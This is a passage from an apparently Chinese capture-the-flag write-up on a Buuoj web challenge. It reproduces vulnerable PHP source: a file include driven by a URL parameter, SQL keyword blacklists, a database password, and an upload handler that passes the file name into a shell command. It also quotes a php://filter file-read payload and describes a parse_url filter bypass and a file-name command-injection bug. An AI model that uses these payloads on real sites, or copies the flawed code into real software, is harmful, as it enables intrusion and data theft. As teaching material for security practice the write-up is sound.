keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span><span class="token comment">//            echo("&lt;script>alert('no premission to visit info, only admin can, you are guest')&lt;/script>");</span>            <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: user.php?page=guest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//if(!in_array($page,$oper_you_can_do))&#123;</span><span class="token comment">//    $page = 'info';</span><span class="token comment">//&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$page</span></span>.php"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>再读一下function.php</p><p><code>function.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: hacker.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"manage"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ffffllllaaaaggg"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">filter_directory_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"manage"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ffffllllaaaaggg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"info"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">Filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password"</span><span class="token punctuation">;</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+>&lt;"</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$whitelist</span></span>"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token variable">$blacklist</span></span>/is"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from `albert_users` where `username_which_you_do_not_know`= '<span class="token interpolation"><span class="token variable">$user</span></span>' and `password_which_you_do_not_know_too` = '<span class="token interpolation"><span class="token variable">$pass</span></span>'"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($res);</span><span class="token comment">//    die();</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>username_which_you_do_not_know<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>isadmin_which_you_do_not_know_too_too<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">updateadmin</span><span class="token punctuation">(</span><span class="token variable">$level</span><span class="token punctuation">,</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '<span class="token interpolation"><span class="token variable">$level</span></span>' where `username_which_you_do_not_know`='<span class="token interpolation"><span class="token variable">$user</span></span>' "</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($res);</span><span class="token comment">//    die();</span><span class="token comment">//    die($res);</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">register</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('<span class="token interpolation"><span class="token variable">$user</span></span>','<span class="token interpolation"><span class="token variable">$pass</span></span>','0')"</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">insert_id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>就这样根据源码的数据…读到了以下界面</p><p><code>config.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token class-name">E_ERROR</span> <span class="token operator">|</span> <span class="token class-name">E_WARNING</span> <span class="token operator">|</span> <span class="token class-name">E_PARSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token constant">BASEDIR</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$OPERATE</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'userinfo'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'search'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$OPERATE_admin</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'userinfo'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'search'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'manage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$DBHOST</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$DBUSER</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$DBPASS</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Nu1LCTF2018!@#qwe"</span><span class="token punctuation">;</span><span class="token comment">//$DBPASS = "";</span><span class="token variable">$DBNAME</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"N1CTF"</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> @<span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$DBHOST</span><span class="token punctuation">,</span> <span class="token variable">$DBUSER</span><span class="token punctuation">,</span> <span class="token variable">$DBPASS</span><span class="token punctuation">,</span> <span class="token variable">$DBNAME</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no sql connection"</span><span class="token operator">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$mysqli</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>guest.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you can not visit it directly "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"templates/guest.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><code>info.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you can not visit it directly "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"templates/info.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><code>ffffllllaaaaggg</code>被过滤</p><h5 id="利用-parse-url解析漏洞"><a href="#利用-parse-url解析漏洞" class="headerlink" title="利用 parse_url解析漏洞"></a>利用 <code>parse_url</code>解析漏洞</h5><p> 当url种出现下面这种情况的url，会解析错误，返回false<br><code>//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code> </p><p><code>ffffllllaaaaggg.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you can not visit it directly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can find sth in m4aaannngggeee"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>m4aaannngggeee.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you can not visit it directly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"templates/upload.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>访问<code>./templates/upload.html</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129211243615.png" class="" title="image-20201129211243615" loading="lazy"><p>赶紧上传个，结果白高兴一场</p><img src="/article/Buuoj-WEB-Write-up/image-20201129211356792.png" class="" title="image-20201129211356792" loading="lazy"><p>利用user.php再读<code>upllloadddd.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$allowtype</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error:can not move"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error:not an upload file！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$newfile</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"file upload success&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token variable">$picdata</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">" | base64 -w 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='data:image/png;base64,"</span><span class="token operator">.</span><span class="token variable">$picdata</span><span class="token operator">.</span><span class="token string double-quoted-string">"'>&lt;/img>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Upload file error: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$allowtype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>访问<code>./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129212543344.png" class="" title="image-20201129212543344" loading="lazy"><p>确认存在文件上传考点，回去找上传点，访问<code>./user.php?page=m4aaannngggeee</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129212613725.png" class="" title="image-20201129212613725" loading="lazy"><p>上传发现</p><img src="/article/Buuoj-WEB-Write-up/image-20201129212720648.png" class="" title="image-20201129212720648" loading="lazy"><p>表明无法通过上传一句话木马获得shell</p><p>后来分析代码发现漏洞</p><h5 id="文件名代码执行漏洞"><a href="#文件名代码执行漏洞" class="headerlink" title="文件名代码执行漏洞"></a>文件名代码执行漏洞</h5><img src="/article/Buuoj-WEB-Write-up/image-20201129212856576.png" class="" title="image-20201129212856576" loading="lazy"><p>扫目录</p><img src="/article/Buuoj-WEB-Write-up/image-20201129213023625.png" class="" title="image-20201129213023625" loading="lazy"><p>flag即在<code>flag_233333</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129213121552.png" 